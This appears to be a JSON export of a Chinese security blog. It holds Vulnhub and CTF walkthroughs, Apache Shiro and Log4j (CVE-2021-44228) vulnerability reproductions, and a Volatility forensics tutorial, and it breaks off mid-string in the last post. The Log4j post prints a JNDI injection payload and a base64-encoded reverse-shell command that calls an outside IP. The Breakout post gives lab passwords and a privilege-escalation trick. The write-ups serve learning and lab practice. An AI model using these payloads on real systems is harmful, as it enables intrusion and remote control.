[{"title":"Breakout","url":"/2023/06/13/Breakout/","content":"<p>靶机下载地址：<a href=\"https://www.vulnhub.com/entry/empire-breakout,751/\">https://www.vulnhub.com/entry/empire-breakout,751/</a></p>\n<h2 id=\"外网打点\"><a href=\"#外网打点\" class=\"headerlink\" title=\"外网打点\"></a>外网打点</h2><p>使用<code>nmap -sn 10.0.2.0/24</code>获取靶机的IP地址</p>\n<p><img src=\"/images/Breakout/image-20230613160024328.png\" alt=\"image-20230613160024328\"></p>\n<p>使用<code>nmap -sC -sV -p 1-20000 -o result.txt 10.0.2.13</code>获取主机的端口信息</p>\n<p><img src=\"/images/Breakout/image-20230613160158283.png\" alt=\"image-20230613160158283\"></p>\n<p>发现有139和445端口，然后使用<code>smbclient -L 10.0.2.13</code>查看一下</p>\n<p><img src=\"/images/Breakout/image-20230613160103804.png\" alt=\"image-20230613160103804\"></p>\n<p>但是无法进一步利用，访问<code>http://10.0.2.13</code></p>\n<p><img src=\"/images/Breakout/image-20230613160224353.png\" alt=\"image-20230613160224353\"></p>\n<p>在源码里面发现</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted :)</span><br><span class=\"line\"></span><br><span class=\"line\">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure>\n\n<p>这好像是<code>brainFuck</code>加密，进行解密得到密码：<code>https://ctf.bugku.com/tool/brainfuck</code></p>\n<p><img src=\"/images/Breakout/image-20230613160354420.png\" alt=\"image-20230613160354420\"></p>\n<blockquote>\n<p>password：.2uqPEfj3D&lt;P’a-3</p>\n</blockquote>\n<p>然后使用<code>enum4linux -a 10.0.2.13</code>获取用户名</p>\n<p><img src=\"/images/Breakout/image-20230613160506628.png\" alt=\"image-20230613160506628\"></p>\n<p>因为这里也没有ssh，所以只能看看20000端口的服务了，发现是webmin的服务，使用刚刚得到的账号密码参数登录</p>\n<p><img src=\"/images/Breakout/image-20230613160724609.png\" alt=\"image-20230613160724609\"></p>\n<p><img src=\"/images/Breakout/image-20230613160757625.png\" alt=\"image-20230613160757625\"></p>\n<p>然后在下面发现可以执行命令，进行反弹shell</p>\n<p><img src=\"/images/Breakout/image-20230613160821758.png\" alt=\"image-20230613160821758\"></p>\n<p><img src=\"/images/Breakout/image-20230613160919225.png\" alt=\"image-20230613160919225\"></p>\n<p><img src=\"/images/Breakout/image-20230613160926731.png\" alt=\"image-20230613160926731\"></p>\n<h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><p>先升级shell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c <span class=\"string\">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class=\"line\">export TERM=xterm</span><br><span class=\"line\">stty raw -echo;fg;reset</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Breakout/image-20230613161433243.png\" alt=\"image-20230613161433243\"></p>\n<p>得到第一个flag</p>\n<p><img src=\"/images/Breakout/image-20230613161452038.png\" alt=\"image-20230613161452038\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>在<code>/var/backup/</code>目录下面发现一个<code>.old_pass</code>文件，但是没有权限读取</p>\n<p><img src=\"/images/Breakout/image-20230613161613576.png\" alt=\"image-20230613161613576\"></p>\n<p>返回到根目录下，查看tar文件的文件类型</p>\n<p><img src=\"/images/Breakout/image-20230613161645230.png\" alt=\"image-20230613161645230\"></p>\n<p>使用<code>getcap tar</code>查看，发现是<code>CAP_DAC_READ_SEARCH</code></p>\n<p><img src=\"/images/Breakout/image-20230613161713183.png\" alt=\"image-20230613161713183\"></p>\n<p><code>CAP_DAC_READ_SEARCH</code>表示他可以读取系统中的所有文件，所以我们可以使用其来读取<code>.old_pass</code>文件</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">./tar -cf flag.tar /var/backups/.old_pass.bak\t# 参数可以使用--help来进行查看</span><br><span class=\"line\">tar -xf flag.tar</span><br><span class=\"line\">cat var/backups/.old_pass.bak</span><br><span class=\"line\">得到密码:Ts&amp;4&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Breakout/image-20230613161906349.png\" alt=\"image-20230613161906349\"></p>\n<p>切换为root用户，使用该密码进行登录</p>\n<p><img src=\"/images/Breakout/image-20230613162034411.png\" alt=\"image-20230613162034411\"></p>\n","categories":["vulnhub"],"tags":["vulnhub","内网"]},{"title":"CVE-2016-4437复现","url":"/2023/06/20/CVE-2016-4437%E5%A4%8D%E7%8E%B0/","content":"<h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>\n<p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为<code>rememberMe</code>的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>\n<p>所以被称为<code>Apache Shiro 1.2.4反序列化漏洞</code>。</p>\n<h2 id=\"漏洞环境\"><a href=\"#漏洞环境\" class=\"headerlink\" title=\"漏洞环境\"></a>漏洞环境</h2><p>使用vulhub搭建环境。</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202534202.png\" alt=\"image-20230620202534202\"></p>\n<p>访问<code>you-ip:8080</code></p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202604159.png\" alt=\"image-20230620202604159\"></p>\n<p>然后进行登录（随意账号密码），然后抓包</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202653697.png\" alt=\"image-20230620202653697\"></p>\n<p>会发现存在<code>rememberMe</code>这个cookie，所以这里大概率是使用shiro框架。</p>\n<p>下面使用工具进行利用：<a href=\"https://github.com/j1anFen/shiro_attack/releases/tag/2.2\">https://github.com/j1anFen/shiro_attack/releases/tag/2.2</a></p>\n<p>这里为了查看流量，使用wireshark进行抓包，可以直接在宿主机进行抓包（搭建docker的宿主机）</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202850422.png\" alt=\"image-20230620202850422\"></p>\n<p>然后进行利用，先点击爆破密钥-&gt;爆破利用链-&gt;存在利用链再执行命令-&gt;上传内存马</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202903118.png\" alt=\"image-20230620202903118\"></p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203013360.png\" alt=\"image-20230620203013360\"></p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203023292.png\" alt=\"image-20230620203023292\"></p>\n<p>上传内存马</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203031325.png\" alt=\"image-20230620203031325\"></p>\n<p>使用蚁剑连接内存马</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203056358.png\" alt=\"image-20230620203056358\"></p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203101914.png\" alt=\"image-20230620203101914\"></p>\n<p>成功得到shell</p>\n<h2 id=\"流量分析\"><a href=\"#流量分析\" class=\"headerlink\" title=\"流量分析\"></a>流量分析</h2><p>过滤http请求，然后一个个流进行查看</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203224831.png\" alt=\"image-20230620203224831\"></p>\n<p>前面的几个都跟这个相似，大概是为了验证是否存在漏洞、爆破密钥以及爆破利用链的流量</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203411322.png\" alt=\"image-20230620203411322\"></p>\n<p>然后得到下面这一段流量</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203717913.png\" alt=\"image-20230620203717913\"></p>\n<p>techo是什么？查看该工具的的源码</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620204040564.png\" alt=\"image-20230620204040564\"></p>\n<p>发现是其头信息，这也是该工具的一个特征</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620204208987.png\" alt=\"image-20230620204208987\"></p>\n<p>c这里是base64编码的命令<code>ls</code>，所以命令是以base64编码的信息，c的值是执行的命令</p>\n<p>下面使用<code>$$$</code>包裹的通过base64解码之后就是命令执行的结果</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620204640640.png\" alt=\"image-20230620204640640\"></p>\n<p>p代表内存马的密码，path表示内存马名，下面的表示内存马的内容</p>\n<p>后面的流量都是蚁剑的流量，在此就不在分析了</p>\n<p><img src=\"/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620204825376.png\" alt=\"image-20230620204825376\"></p>\n","categories":["vulhub"],"tags":["vulhub","漏洞复现"]},{"title":"2022——赣网杯MISC题目来学习volatility","url":"/2022/12/09/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/","content":"<p>下载的附件是一个raw文件</p>\n<p>1.先使用vol查看镜像的配置文件</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw imageinfo</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-16-1024x329.png\"></p>\n<p>2.发现是<code>Win7SP1x64</code>的系统，然后查看进程</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 pslist</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-17-1024x546.png\"></p>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-18-1024x542.png\"></p>\n<p>3.例如这里要导出的文件是<code>DumpIt.exe</code>，那么我们可以查看cmd使用情况</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 cmdscan</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-19-1024x228.png\"></p>\n<p>4.然后将<code>DumpIt.exe</code>导出到本地（从内存dump进程的内存，提取进程）</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 memdump -p 4272 –dump-dir&#x3D;.&#x2F;</p>\n<p>-p：指定PID号<br>–dump-dir&#x3D;接上要存储文件的路径</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-20-1024x203.png\"></p>\n<p>这里得到文件之后我们可以使用foremost进行分离</p>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-21-1024x508.png\"></p>\n<p>5.使用命令查看桌面的情况</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 filescan |grep Desktop</p>\n<p>filescan：扫描文件，可以搭配grep使用，从而快速查找关键文件</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-22-1024x542.png\"></p>\n<p>6.这里发现了<code>flag.kdbxdbx</code>文件，应该是有内容的，所以我们将其导出</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000002a2897e0 -D .&#x2F;</p>\n<p>dumpfiles：从内存dump文件<br>-Q：指定偏移量<br>-D：存储文件的文件夹</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-23-1024x214.png\"></p>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-24-1024x217.png\"></p>\n<p>然后本题使用<code>keePass</code>解密即可得到flag，之前得到的是火狐浏览器密码，使用<code>firepwd</code>即可解密得到<code>keePass</code>密码</p>\n<p>7.列出历史cmd命令</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 cmdline</p>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 cmdscan</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-25-1024x541.png\"></p>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-26-1024x173.png\"></p>\n<p>8.列出进程列表</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 psscan</p>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 pslist</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-27-1024x509.png\"></p>\n<p>9.扫描建立的连接和套接字，类似于netstat</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 netscan</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-28-1024x542.png\"></p>\n<p>10.扫描windows服务列表</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 svcscan</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-29-1024x542.png\"></p>\n<p>11.显示GDI样式的截屏</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 screenshot –dump-dir&#x3D;.&#x2F;</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-30-1024x447.png\"></p>\n<p>12.显示每个进程的加载dll列表</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 dlllist</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-31-1024x542.png\"></p>\n<p>13.提取日志文件</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 dumpregistry –dump-dir&#x3D;.&#x2F;</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-32-1024x540.png\"></p>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-33-1024x101.png\"></p>\n<p>14.查看用户名密码信息</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 hashdump</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-34-1024x179.png\"></p>\n<p>15.查看浏览器历史记录</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 iehistory</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-35-1024x204.png\"></p>\n<p>16.查看文件</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 filescan</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-36-1024x541.png\"></p>\n<p>17.查看注册表配置单元</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 hivelist</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-37-1024x266.png\"></p>\n<p>18.查看注册表键名</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 hivedump -o 0xfffff8a005fef010</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-38-1024x127.png\"></p>\n<p>19.查看注册表键值</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.vmem –profile&#x3D;Win7SP1x64 printkey -K “xxxxxxx”</p>\n</blockquote>\n<p>20.查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 userassist</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-39-1024x543.png\"></p>\n<p>21.最大程序提取信息</p>\n<blockquote>\n<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 timeliner</p>\n</blockquote>\n<p><img src=\"/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-40-1024x541.png\"></p>\n<p>参考文章：</p>\n<ul>\n<li><a href=\"https://juejin.cn/post/7107500079816114189\">VOL（Volatility）内存取证工具</a></li>\n<li><a href=\"https://wiki.wgpsec.org/knowledge/ctf/Volatility.html\">Volatility取证分析工具</a></li>\n</ul>\n<p>如果文章有何不妥之处，请您指出。</p>\n","categories":["web安全学习"],"tags":["比赛","misc","CTF","取证"]},{"title":"CVE-2021-44228复现","url":"/2023/06/19/CVE-2021-44228%E5%A4%8D%E7%8E%B0/","content":"<h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>log4j 2是Java语言的日志处理套件，使用极其广泛。在其2.0到2.14.1版本中<code>存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过lookup进行JNDI注入，执行任意代码</code>。</p>\n<h2 id=\"漏洞环境\"><a href=\"#漏洞环境\" class=\"headerlink\" title=\"漏洞环境\"></a>漏洞环境</h2><p>使用vulhub搭建环境。</p>\n<p><img src=\"/images/CVE-2021-44228%E5%A4%8D%E7%8E%B0/image-20230619105310171.png\" alt=\"image-20230619105310171\"></p>\n<p>访问<code>http://you-ip:8983</code></p>\n<p><img src=\"/images/CVE-2021-44228%E5%A4%8D%E7%8E%B0/image-20230619105400013.png\" alt=\"image-20230619105400013\"></p>\n<p>判断是否存在JNDI注入</p>\n<p><code>$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;</code>是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值发送如下数据包：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.example.com&#125; HTTP/1.1</span><br><span class=\"line\">Host: your-ip:8983</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Accept-Language: en</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/CVE-2021-44228%E5%A4%8D%E7%8E%B0/image-20230619105601965.png\" alt=\"image-20230619105601965\"></p>\n<p>成功获取版本号</p>\n<p><img src=\"/images/CVE-2021-44228%E5%A4%8D%E7%8E%B0/image-20230619105619618.png\" alt=\"image-20230619105619618\"></p>\n<p>然后我们可以使用JNDI注入工具进行利用。工具链接：<a href=\"https://github.com/su18/JNDI\">https://github.com/su18/JNDI</a></p>\n<p>使用方式：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br></pre></td></tr></table></figure>\n\n<p>如下命令：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuMTk4LjQ1LjE2Mi84MDAwIDAmPjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 116.198.45.162</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/CVE-2021-44228%E5%A4%8D%E7%8E%B0/image-20230619111334397.png\" alt=\"image-20230619111334397\"></p>\n<p>监听8000端口，然后再进行请求</p>\n<p><img src=\"/images/CVE-2021-44228%E5%A4%8D%E7%8E%B0/image-20230619111908065.png\" alt=\"image-20230619111908065\"></p>\n<p>成功反弹shell</p>\n","categories":["vulhub"],"tags":["vulhub","漏洞复现"]},{"title":"EmpireLupinOne","url":"/2023/06/12/EmpireLupinOne/","content":"<p>靶机下载地址：<a href=\"https://www.vulnhub.com/entry/empire-lupinone,750/\">https://www.vulnhub.com/entry/empire-lupinone,750/</a></p>\n<h2 id=\"外网打点\"><a href=\"#外网打点\" class=\"headerlink\" title=\"外网打点\"></a>外网打点</h2><p>使用<code>nmap -sn 10.0.2.0/24</code>获取主机的IP地址</p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612120205844.png\" alt=\"image-20230612120205844\"></p>\n<p>然后使用<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.11</code>获取端口信息</p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612120258246.png\" alt=\"image-20230612120258246\"></p>\n<p>发现了<code>/~myfiles</code>目录，访问一下</p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612120346943.png\" alt=\"image-20230612120346943\"></p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612120354494.png\" alt=\"image-20230612120354494\"></p>\n<p>可能是要修改<code>myfiles</code>，使用<code>ffuf</code>工具进行FUZZ</p>\n<blockquote>\n<p>ffuf -c -w &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;web&#x2F;dic&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt -u ‘<a href=\"http://10.0.2.11/~FUZZ\">http://10.0.2.11/~FUZZ</a>‘ -t 300</p>\n</blockquote>\n<p><img src=\"/images/EmpireLupinOne/image-20230612120556289.png\" alt=\"image-20230612120556289\"></p>\n<p>访问<code>http://10.0.2.11/~secret</code></p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612120628476.png\" alt=\"image-20230612120628476\"></p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,</span><br><span class=\"line\">Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.</span><br><span class=\"line\">I&#x27;m smart I know that.</span><br><span class=\"line\">Any problem let me know</span><br><span class=\"line\">Your best friend icex64 </span><br></pre></td></tr></table></figure>\n\n<p>说明存在一个秘钥文件，再次进行fuzz</p>\n<blockquote>\n<p>ffuf -c -ic -w &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;web&#x2F;dic&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt -u ‘<a href=\"http://10.0.2.11/~secret/.FUZZ\">http://10.0.2.11/~secret/.FUZZ</a>‘ -t 300 -fc 403 -e .txt,.html</p>\n</blockquote>\n<p><img src=\"/images/EmpireLupinOne/image-20230612120857192.png\" alt=\"image-20230612120857192\"></p>\n<p>访问<code>http://10.0.2.11/~secret/.mysecret.txt</code></p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">cGxD6KNZQddY6iCsSuqPzUdqSx4F5ohDYnArU3kw5dmvTURqcaTrncHC3NLKBqFM2ywrNbRTW3eTpUvEz9qFuBnyhAK8TWu9cFxLoscWUrc4rLcRafiVvxPRpP692Bw5bshu6ZZpixzJWvNZhPEoQoJRx7jUnupsEhcCgjuXD7BN1TMZGL2nUxcDQwahUC1u6NLSK81Yh9LkND67WD87Ud2JpdUwjMossSeHEbvYjCEYBnKRPpDhSgL7jmTzxmtZxS9wX6DNLmQBsNT936L6VwYdEPKuLeY6wuyYmffQYZEVXhDtK6pokmA3Jo2Q83cVok6x74M5DA1TdjKvEsVGLvRMkkDpshztiGCaDu4uceLw3iLYvNVZK75k9zK9E2qcdwP7yWugahCn5HyoaooLeBDiCAojj4JUxafQUcmfocvugzn81GAJ8LdxQjosS1tHmriYtwp8pGf4Nfq5FjqmGAdvA2ZPMUAVWVHgkeSVEnooKT8sxGUfZxgnHAfER49nZnz1YgcFkR73rWfP5NwEpsCgeCWYSYh3XeF3dUqBBpf6xMJnS7wmZa9oWZVd8Rxs1zrXawVKSLxardUEfRLh6usnUmMMAnSmTyuvMTnjK2vzTBbd5djvhJKaY2szXFetZdWBsRFhUwReUk7DkhmCPb2mQNoTSuRpnfUG8CWaD3L2Q9UHepvrs67YGZJWwk54rmT6v1pHHLDR8gBC9ZTfdDtzBaZo8sesPQVbuKA9VEVsgw1xVvRyRZz8JH6DEzqrEneoibQUdJxLVNTMXpYXGi68RA4V1pa5yaj2UQ6xRpF6otrWTerjwALN67preSWWH4vY3MBv9Cu6358KWeVC1YZAXvBRwoZPXtquY9EiFL6i3KXFe3Y7W4Li7jF8vFrK6woYGy8soJJYEbXQp2NWqaJNcCQX8umkiGfNFNiRoTfQmz29wBZFJPtPJ98UkQwKJfSW9XKvDJwduMRWey2j61yaH4ij5uZQXDs37FNV7TBj71GGFGEh8vSKP2gg5nLcACbkzF4zjqdikP3TFNWGnij5az3AxveN3EUFnuDtfB4ADRt57UokLMDi1V73Pt5PQe8g8SLjuvtNYpo8AqyC3zTMSmP8dFQgoborCXEMJz6npX6QhgXqpbhS58yVRhpW21Nz4xFkDL8QFCVH2beL1PZxEghmdVdY9N3pVrMBUS7MznYasCruXqWVE55RPuSPrMEcRLoCa1XbYtG5JxqfbEg2aw8BdMirLLWhuxbm3hxrr9ZizxDDyu3i1PLkpHgQw3zH4GTK2mb5fxuu9W6nGWW24wjGbxHW6aTneLweh74jFWKzfSLgEVyc7RyAS7Qkwkud9ozyBxxsV4VEdf8mW5g3nTDyKE69P34SkpQgDVNKJvDf